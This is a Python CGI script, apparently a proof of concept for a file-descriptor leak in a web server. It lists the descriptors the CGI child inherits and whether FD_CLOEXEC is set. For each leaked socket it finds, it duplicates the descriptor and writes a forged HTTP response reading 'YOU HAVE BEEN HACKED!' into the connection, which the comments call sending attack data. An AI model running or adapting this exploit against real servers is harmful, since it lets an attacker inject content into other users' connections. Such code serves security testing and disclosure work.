#!/usr/bin/env python3
import os
import socket
import time

def get_fd_info(fd):
    try:
        link = os.readlink("/proc/self/fd/" + str(fd))
        return link
    except OSError:
        return None

def main():
    print("Content-Type: text/plain\r\n\r\n")
    print("=== OPEN FILE DESCRIPTORS IN CGI CHILD ===\n")

    fd_dir = "/proc/self/fd"
    try:
        fds = os.listdir(fd_dir)
    except OSError as e:
        print("Cannot open /proc/self/fd: " + str(e))
        return

    fds_sorted = sorted(fds, key=lambda x: int(x))

    for fd_str in fds_sorted:
        fd_num = int(fd_str)
        target = get_fd_info(fd_num)
        if target is None:
            continue

        try:
            flags = os.get_inheritable(fd_num)
            cloexec_status = "NO FD_CLOEXEC (inherited!)" if flags else "FD_CLOEXEC set (closed on exec)"
        except OSError:
            cloexec_status = "unknown"

        label = ""
        if fd_num == 0:
            label = " <-- STDIN"
        elif fd_num == 1:
            label = " <-- STDOUT"
        elif fd_num == 2:
            label = " <-- STDERR"

        print("fd " + str(fd_num) + ": " + target + label)
        print("   status: " + cloexec_status)

        # if leaked socket -> try to send attack data
        if flags and "socket" in target and fd_num > 2:
            try:
                fd_copy = os.dup(fd_num)
                sock = socket.fromfd(fd_copy, socket.AF_INET, socket.SOCK_STREAM)
                os.close(fd_copy)
                peer = sock.getpeername()
                print("   *** ATTACK: sending to " + str(peer) + " ***")
                sock.send(b"HTTP/1.1 200 OK\r\nContent-Length: 22\r\n\r\nYOU HAVE BEEN HACKED!\n")
                sock.close()
                print("   *** ATTACK SENT ***")
            except Exception as e:
                print("   attack failed: " + str(e))

        print("")

if __name__ == "__main__":
    main()
